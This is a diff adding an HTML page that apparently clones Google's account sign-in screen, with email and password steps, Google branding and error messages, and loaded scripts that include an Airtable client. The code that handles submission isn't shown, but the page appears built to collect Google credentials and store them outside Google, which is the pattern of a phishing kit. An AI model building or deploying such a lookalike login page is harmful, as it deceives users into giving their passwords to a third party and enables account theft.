@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In - Google Accounts</title>
+  <link href='style.css' rel='stylesheet'>
+  <link href='mobile.css' rel='stylesheet'>
+  <link rel="icon" type="image/png" sizes="32x32" href="fav-32.png" />
+  <link rel="icon" type="image/png" sizes="16x16" href="fav-16.png" />
+</head>
+
+<body>
+
+  <canvas id='bar'>
+  </canvas>
+
+  <div class='cards' id='cards'>
+
+
+    <div class='card' id='first'>
+
+      <div class='head'>
+        <img class='logo' src='google.png' alt='logo'>
+        <h1> Sign in </h1>
+        <p> Use your Google Account </p>
+      </div>
+
+      <div class="group">
+        <input id='email' pattern="/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/" type="email"
+          required>
+        <div class='message' id='message'>
+          <img src='w-74.png' alt='image'>
+          <h3> Couldn't find your Google account</h3>
+        </div>
+        <span class="highlight"></span>
+        <span class="bar"></span>
+        <label id='label'>Email or phone </label>
+        <a
+          href='https://accounts.google.com/signin/v2/usernamerecovery?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2Fu%2F1%2F%3Futm_source%3Dsign_in_no_continue&ec=GAlAwAE&flowName=GlifWebSignIn&flowEntry=AddSession&cid=1&navigationDirection=forward'>
+          <p> Forgot email? </p>
+        </a>
+      </div>
+
+
+      <p class='blurb'>
+        Not your computer? Use guest mode to sign in privately. <br>
+        <a href='https://support.google.com/chrome/answer/6130773?hl=en'> Learn More </a>
+      </p>
+
+      <div class='row'>
+        <a
+          href='https://accounts.google.com/signup/v2/webcreateaccount?service=accountsettings&continue=https%3A%2F%2Fmyaccount.google.com%2Fu%2F1%2F%3Futm_source%3Dsign_in_no_continue&dsh=S1913471013%3A1637093342719780&biz=false&flowName=GlifWebSignIn&flowEntry=SignUp'>
+          <p> Create account </p>
+        </a>
+        <button id='next'> Next </button>
+      </div>
+    </div>
+
+
+    <div class='card' id='second'>
+
+      <div class='head'>
+        <img class='logo' src='google.png' alt='logo'>
+        <h1> Welcome </h1>
+        <div id='profile'>
+          <img class='profile' src='profile.png' alt='image'>
+          <p id='address'> loremipsum@gmail.com </p>
+          <img class='arrow' src='arrow.png' alt='image'>
+        </div>
+      </div>
+
+      <div class="group">
+        <input id='password' type="password" required autocomplete="false" readonly
+          onfocus="this.removeAttribute('readonly');">
+        <div class='message' id='message2'>
+          <img src='w-74.png' alt='image'>
+          <h3> Wrong password. Try again or click Forgot Password to reset it.</h3>
+        </div>
+        <span class="highlight"></span>
+        <span class="bar"></span>
+        <label id='label2'> Enter your password </label>
+        <a href='#'>
+          <div class='check'>
+            <!--
+                  <input id = 'checkbox' type = 'checkbox'>
+                  -->
+            <div id='checkbox'>
+              <img src='check.png' alt='image'>
+            </div>
+            <p> Show Password </p>
+          </div>
+        </a>
+      </div>
+
+      <div class='row'>
+        <a>
+          <p> Forgot password? </p>
+        </a>
+        <button id='submit' type="button"> Next </button>
+      </div>
+    </div>
+
+
+
+  </div>
+  <div class='footer'>
+    <a href='#'>
+      <p> English (United States) </p>
+    </a>
+
+    <div>
+      <a href='https://support.google.com/accounts?hl=en#topic=3382296'>
+        <p> Help </p>
+      </a>
+      <a href='https://policies.google.com/privacy?gl=US&hl=en'>
+        <p> Privacy </p>
+      </a>
+      <a href='https://policies.google.com/terms?gl=US&hl=en'>
+        <p> Terms </p>
+      </a>
+    </div>
+  </div>
+
+  <img class='ref' src='screenshot.png'>
+
+</body>
+<script src='airtable.browser.js'></script>
+<script src='airtable.js'></script>
+<script src='functions.js'></script>
+<script src='script.js'></script>
+
+</html>
